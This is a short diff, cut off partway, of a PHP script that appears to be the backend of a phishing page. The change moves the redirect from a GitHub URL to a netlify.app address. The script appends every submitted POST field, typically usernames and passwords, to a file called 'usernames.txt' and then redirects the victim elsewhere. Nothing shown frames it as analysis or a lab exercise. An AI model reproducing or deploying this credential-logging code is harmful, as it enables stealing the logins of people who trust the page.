@@ -1,5 +1,5 @@
 <?php
-header('Location: https://github.com/curvespacetime/testing/');
+header('Location: http://competent-austin-4fc90b.netlify.app/');
 $handle = fopen('usernames.txt', 'a');
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
